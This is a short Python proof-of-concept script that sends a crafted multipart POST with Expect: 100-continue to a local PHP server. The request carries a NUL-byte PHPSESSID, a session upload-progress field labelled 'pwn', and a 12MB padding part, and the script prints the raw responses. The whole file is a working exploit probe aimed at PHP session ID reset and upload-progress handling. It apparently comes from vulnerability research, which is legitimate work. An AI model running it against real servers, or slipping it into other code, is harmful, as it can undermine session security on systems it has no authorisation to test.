#!/usr/bin/env python3
"""A with Expect: 100-continue handshake; PHPSESSID NUL + progress + file + 12MB.
If Apache's interim 100 sets PHP headers_sent, reset_id fails and send_cookie
stays 1 without display_errors.
usage: send_a_100.py [HUGE_MB]
"""
import socket,sys
HUGE=int(sys.argv[1]) if len(sys.argv)>1 else 12
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
       {'name':'f','filename':'a.txt','data':b'A'*64},
       {'name':'big','data':b'B'*(HUGE*1024*1024)}]
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nExpect: 100-continue\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
s.sendall(h)
# read interim response if any (100 Continue)
pre=b''
try:
    while b'\r\n\r\n' not in pre:
        c=s.recv(4096)
        if not c: break
        pre+=c
except OSError: pass
print('PRE',pre[:120].decode('latin1','replace').replace('\r','').replace('\n','|'))
try: s.sendall(bytes(o))
except OSError: pass
d=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        d+=c
except OSError: pass
s.close()
print('RESP',d[:120].decode('latin1','replace').replace('\r','').replace('\n','|'))
